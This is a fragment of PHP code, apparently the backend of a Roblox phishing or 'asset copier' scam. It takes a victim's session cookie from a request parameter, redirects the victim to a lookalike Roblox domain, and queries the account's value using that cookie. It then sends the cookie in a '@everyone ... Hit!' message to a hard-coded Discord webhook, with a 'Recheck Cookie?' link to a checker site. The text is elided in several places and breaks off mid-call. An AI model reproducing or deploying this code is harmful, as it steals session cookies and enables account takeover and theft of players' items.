<?php
   ...
   $cookie = $_REQUEST['t'];
    header("location: https://robloxavatar.xyz/{folder}/{folder1}/");    
...
$idiotrap = getrap($profile["UserID"], $cookie);        
             ...
             "content" => "@everyone New Asset Copier AutoHar Hit!",
                "embeds" => [
                    [
                        ...
                        "author" => [
                             "name" => "Recheck Cookie?",
                             "url" => "https://rblxvip.ga/cookiechecker.php"
                        ],
                        "fields" => [
                            [
        ...
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://discord.com/api/webhooks/930755536062918716/qJ3peRZOBWEMRpLiSlRFc3dPhEDRjPtM9euSip-MLYLlP0EWTMh2y75XTi2x87489vs_",
            CURLOPT_POST => true,
